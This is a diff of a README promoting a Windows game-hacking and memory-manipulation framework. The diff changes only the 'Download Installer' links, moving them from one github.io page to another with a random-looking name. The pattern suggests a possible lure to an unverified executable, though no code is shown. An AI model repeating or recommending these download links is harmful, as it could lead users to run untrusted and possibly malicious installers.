@@ -2,7 +2,7 @@
 
 Game Hacking Frameworks – Introducing the Advanced Memory Base for 2026, a powerful and versatile tool designed for game reverse engineering, memory manipulation, and advanced modding on Windows 10 and Windows 11. This framework provides a comprehensive set of utilities for developers, security researchers, and modding enthusiasts to explore and interact with game internals in a safe and controlled environment.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -83,7 +83,7 @@ Common issues and solutions:
 
 For the latest version and updates, visit the official download page:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## License and Disclaimer
 
